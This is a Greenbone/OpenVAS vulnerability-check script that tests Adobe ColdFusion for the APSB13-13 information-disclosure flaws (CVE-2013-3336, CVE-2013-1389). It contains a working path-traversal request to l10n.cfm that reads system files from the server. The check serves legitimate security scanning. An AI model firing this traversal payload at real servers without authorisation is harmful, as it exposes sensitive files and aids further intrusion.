CPE = "cpe:/a:adobe:coldfusion";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103709" );
	script_bugtraq_id( 59773, 59849 );
	script_cve_id( "CVE-2013-3336", "CVE-2013-1389" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Adobe ColdFusion Information Disclosure Vulnerability (APSB13-13)" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/59773" );
	script_xref( name: "URL", value: "http://www.adobe.com/support/security/bulletins/apsb13-13.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-05-10 11:21:00 +0200 (Fri, 10 May 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_coldfusion_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "adobe/coldfusion/http/detected" );
	script_tag( name: "solution", value: "Apply the patch from the referenced advisory." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Adobe ColdFusion is prone to an information-disclosure vulnerability." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to retrieve files stored on the server
  and obtain sensitive information. This may aid in launching further attacks." );
	script_xref( name: "URL", value: "http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-13.html" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../" + files[file] + "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

